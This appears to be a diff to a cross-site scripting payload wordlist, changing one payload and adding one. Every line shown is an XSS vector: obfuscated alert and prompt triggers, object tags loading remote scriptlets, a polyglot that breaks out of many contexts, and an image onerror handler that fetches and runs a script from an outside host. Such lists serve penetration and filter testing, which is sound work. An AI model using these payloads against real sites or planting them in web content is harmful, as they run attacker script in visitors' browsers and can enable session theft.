@@ -699,7 +699,7 @@ input1=<script/&in%u2119ut1=>al%u0117rt('1')</script>
 <object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>
 "/><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
 <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
-/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"///><img id="b1" src=1 onerror='$.getScript("http://xss.cx.js", function() { c(); });'>'
+/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"///><img id="b1" src=1 onerror='$.getScript("http://xss.cx/xss.js", function() { c(); });'>'
 "onresize=prompt(1)>
 "<option>'><button><img src=x onerror=confirm(0);></button></option>"
 <option>'><button><img src=x onerror=confirm(0);></button></option>
@@ -1201,3 +1201,4 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <body/onactivate=URL=name//
 <mArquee%20onStart%3D[~[onmouseleave(([[(alert(1))]]))]]%20]
 <svg><script /* /*/*/*>\u0061l\u0065rt`X`<
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
